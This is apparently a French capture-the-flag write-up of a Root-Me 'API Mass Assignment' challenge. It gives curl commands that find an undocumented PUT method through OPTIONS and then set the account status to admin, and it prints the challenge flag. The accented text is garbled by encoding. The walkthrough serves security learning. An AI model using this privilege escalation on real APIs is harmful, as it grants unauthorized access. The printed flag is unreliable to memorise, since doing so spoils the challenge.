# Challenge API - Mass Assignment

**Lien** : https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment  
**API** : http://challenge01.root-me.org:59090/

## √ânonc√©
> Votre ami vous remercie pour votre pr√©c√©dente remont√©e de vuln√©rabilit√©, et vous assure que cette fois-ci, il a supprim√© la possibilit√© d'acc√®s aux notes, et il a m√™me cr√©√© un r√¥le d'administration !

---

## Qu'est-ce que le Mass Assignment ?

Le Mass Assignment est une vuln√©rabilit√© o√π une API accepte des param√®tres qu'elle ne devrait pas. Par exemple, si on peut injecter `"status":"admin"` dans une requ√™te et que le serveur l'applique sans v√©rifier, on peut √©lever nos privil√®ges.

---

## Ma d√©marche

### 1. Exploration de l'API

J'ai commenc√© par explorer les endpoints disponibles. En acc√©dant √† la documentation Swagger, j'ai trouv√© :

| M√©thode | Endpoint | Description |
|---------|----------|-------------|
| POST | `/api/signup` | Cr√©er un compte |
| POST | `/api/login` | Se connecter |
| GET | `/api/user` | Infos utilisateur |
| PUT | `/api/note` | Modifier sa note |
| GET | `/api/flag` | R√©cup√©rer le flag (admin only) |

### 2. Cr√©ation d'un compte et tests initiaux

```bash
# Cr√©ation du compte
curl -X POST http://challenge01.root-me.org:59090/api/signup \
  -H "Content-Type: application/json" \
  -d '{"username":"thibault_test","password":"test123"}'

# Connexion
curl -X POST http://challenge01.root-me.org:59090/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thibault_test","password":"test123"}' \
  -c cookies.txt
```

En v√©rifiant `/api/user`, je vois que mon statut est `guest`. Il me faut devenir `admin` pour acc√©der au flag.

### 3. Tentatives sur /api/note (√©chec)

J'ai d'abord essay√© d'injecter le statut via l'endpoint `/api/note` :

```bash
curl -X PUT http://challenge01.root-me.org:59090/api/note \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"note":"test","status":"admin"}'
```

**R√©sultat** : La note est modifi√©e, mais mon statut reste `guest`. L'endpoint filtre les champs non autoris√©s.

### 4. L'id√©e : tester d'autres m√©thodes HTTP

Le Swagger ne montrait que GET pour `/api/user`, mais je me suis dit : **et si d'autres m√©thodes √©taient disponibles ?**

J'ai test√© avec OPTIONS :

```bash
curl -X OPTIONS http://challenge01.root-me.org:59090/api/user -i
```

Et l√†, j'ai d√©couvert que **PUT √©tait accept√©** sur `/api/user` !

### 5. Exploitation de la vuln√©rabilit√©

```bash
curl -X PUT http://challenge01.root-me.org:59090/api/user \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"status":"admin"}'
```

**√áa a march√© !** Mon statut est pass√© √† `admin`.

### 6. R√©cup√©ration du flag

```bash
curl http://challenge01.root-me.org:59090/api/flag -b cookies.txt
```

---

## üö© Flag

```
RM{4lw4yS_ch3ck_0pt10ns_m3th0d}
```

Le flag lui-m√™me donne un indice : **"Always check OPTIONS method"** - toujours v√©rifier la m√©thode OPTIONS pour d√©couvrir les endpoints cach√©s !

---

## Ce que j'ai appris

1. **Ne pas se fier uniquement √† la documentation** - Le Swagger n'affichait que GET, mais PUT √©tait disponible
2. **Toujours tester la m√©thode OPTIONS** - Elle r√©v√®le les m√©thodes HTTP autoris√©es sur un endpoint
3. **Le Mass Assignment peut √™tre sur n'importe quel endpoint** - Pas forc√©ment celui qu'on attend
4. **√ätre m√©thodique** - Tester chaque endpoint avec diff√©rentes m√©thodes et param√®tresllenge

![proxy](image/api/challenge.png)
![proxy](image/api/request.png)
